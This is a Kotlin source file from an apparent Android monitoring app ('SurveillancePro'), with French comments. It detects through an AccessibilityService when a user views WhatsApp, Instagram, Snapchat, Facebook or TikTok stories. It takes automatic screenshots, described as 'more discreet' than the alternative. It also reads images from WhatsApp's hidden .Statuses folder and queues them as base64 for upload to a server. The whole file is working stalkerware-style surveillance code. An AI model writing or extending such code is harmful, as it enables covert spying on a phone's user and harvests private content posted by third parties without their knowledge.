package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Service de capture de Stories et Statuts éphémères.
 * 
 * SANS ROOT - Utilise AccessibilityService pour détecter quand
 * l'utilisateur regarde une story et capture automatiquement.
 * 
 * APPS SUPPORTÉES:
 * - WhatsApp Status
 * - Instagram Stories
 * - Snapchat Stories
 * - Facebook Stories
 * - TikTok
 * 
 * MÉTHODE:
 * 1. AccessibilityService détecte l'ouverture d'une story
 * 2. Capture d'écran automatique via MediaProjection
 * 3. Envoi au serveur avec métadonnées
 * 
 * AVANTAGE: Capture le contenu AVANT qu'il disparaisse
 */
object StoryCapture {
    
    private const val TAG = "StoryCapture"
    
    // Packages des apps avec stories
    private val STORY_APPS = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "com.snapchat.android" to "Snapchat",
        "com.facebook.katana" to "Facebook",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.ss.android.ugc.trill" to "TikTok",
    )
    
    // Mots-clés dans les vues qui indiquent une story
    private val STORY_INDICATORS = listOf(
        "story", "status", "statut", "stories",
        "StatusListActivity", "StoryViewerActivity",
        "DirectStoryViewerFragment", "ReelViewerFragment",
        "SnapPreviewFragment", "StoryPlayerActivity",
    )
    
    private var isCapturing = false
    private var lastCaptureTime = 0L
    private val CAPTURE_COOLDOWN = 3000L // 3 secondes entre captures
    
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    private val handler = Handler(Looper.getMainLooper())
    
    /**
     * Vérifie si l'événement d'accessibilité correspond à une story.
     * Appelé depuis SupervisionAccessibilityService.
     */
    fun checkForStory(event: AccessibilityEvent, context: Context): Boolean {
        val packageName = event.packageName?.toString() ?: return false
        val appName = STORY_APPS[packageName] ?: return false
        
        // Vérifier si c'est une vue de story
        val className = event.className?.toString() ?: ""
        val contentDesc = event.contentDescription?.toString() ?: ""
        val text = event.text?.joinToString(" ") ?: ""
        
        val isStoryView = STORY_INDICATORS.any { indicator ->
            className.contains(indicator, ignoreCase = true) ||
            contentDesc.contains(indicator, ignoreCase = true) ||
            text.contains(indicator, ignoreCase = true)
        }
        
        if (!isStoryView) return false
        
        // Cooldown pour éviter les captures multiples
        val now = System.currentTimeMillis()
        if (now - lastCaptureTime < CAPTURE_COOLDOWN) return false
        
        Log.d(TAG, "Story detected in $appName: $className")
        
        // Programmer une capture après un court délai (pour que le contenu se charge)
        handler.postDelayed({
            captureStory(context, appName, packageName, className)
        }, 500)
        
        lastCaptureTime = now
        return true
    }
    
    /**
     * Capture une story via screenshot.
     * Utilise le ScreenCaptureService si disponible.
     */
    private fun captureStory(context: Context, appName: String, packageName: String, viewName: String) {
        if (isCapturing) return
        isCapturing = true
        
        val storage = DeviceStorage.getInstance(context)
        val queue = EventQueue.getInstance(context)
        
        if (!storage.hasAccepted || storage.deviceToken == null) {
            isCapturing = false
            return
        }
        
        try {
            // Envoyer un événement de détection de story
            queue.enqueue("story_detected", mapOf(
                "app" to appName,
                "packageName" to packageName,
                "viewName" to viewName,
                "timestamp" to dateFormat.format(Date()),
            ))
            
            // Demander une capture d'écran via RapidScreenCapture (AccessibilityService)
            // Plus discret que MediaProjection
            RapidScreenCapture.captureOnce(context)
            
            Log.d(TAG, "Story capture requested for $appName")
            
        } catch (e: Exception) {
            Log.e(TAG, "Story capture failed: ${e.message}")
        } finally {
            isCapturing = false
        }
    }
    
    /**
     * Capture manuelle d'une story (appelée depuis une commande).
     */
    fun captureNow(context: Context, appName: String = "Unknown") {
        val queue = EventQueue.getInstance(context)
        
        queue.enqueue("story_capture_requested", mapOf(
            "app" to appName,
            "timestamp" to dateFormat.format(Date()),
            "manual" to true,
        ))
        
        // Capture via RapidScreenCapture
        RapidScreenCapture.captureOnce(context)
    }
}

/**
 * Extension pour capturer les statuts WhatsApp spécifiquement.
 * WhatsApp stocke les statuts dans un dossier accessible.
 */
object WhatsAppStatusCapture {
    
    private const val TAG = "WhatsAppStatus"
    
    // Chemins où WhatsApp stocke les statuts (varient selon la version)
    private val STATUS_PATHS = listOf(
        "/storage/emulated/0/WhatsApp/Media/.Statuses",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses",
        "/sdcard/WhatsApp/Media/.Statuses",
    )
    
    /**
     * Scanne les statuts WhatsApp récents.
     * SANS ROOT - Utilise le stockage externe accessible.
     */
    fun scanRecentStatuses(context: Context) {
        val storage = DeviceStorage.getInstance(context)
        val queue = EventQueue.getInstance(context)
        
        if (!storage.hasAccepted) return
        
        for (path in STATUS_PATHS) {
            val dir = java.io.File(path)
            if (!dir.exists() || !dir.isDirectory) continue
            
            val files = dir.listFiles() ?: continue
            val recentFiles = files.filter { file ->
                // Fichiers des dernières 24h
                System.currentTimeMillis() - file.lastModified() < 24 * 60 * 60 * 1000
            }.sortedByDescending { it.lastModified() }
            
            for (file in recentFiles.take(10)) { // Max 10 statuts
                try {
                    if (file.isFile && (file.name.endsWith(".jpg") || file.name.endsWith(".mp4"))) {
                        val isVideo = file.name.endsWith(".mp4")
                        
                        if (!isVideo && file.length() < 5 * 1024 * 1024) { // Images < 5MB
                            val bytes = file.readBytes()
                            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                            
                            queue.enqueue("whatsapp_status_captured", mapOf(
                                "filename" to file.name,
                                "isVideo" to false,
                                "sizeBytes" to file.length(),
                                "imageBase64" to base64,
                                "capturedAt" to SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date()),
                                "fileDate" to SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date(file.lastModified())),
                            ))
                            
                            Log.d(TAG, "WhatsApp status captured: ${file.name}")
                        } else if (isVideo) {
                            // Pour les vidéos, juste envoyer les métadonnées
                            queue.enqueue("whatsapp_status_detected", mapOf(
                                "filename" to file.name,
                                "isVideo" to true,
                                "sizeBytes" to file.length(),
                                "fileDate" to SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date(file.lastModified())),
                            ))
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to capture status: ${e.message}")
                }
            }
            
            break // Un seul chemin trouvé suffit
        }
    }
}
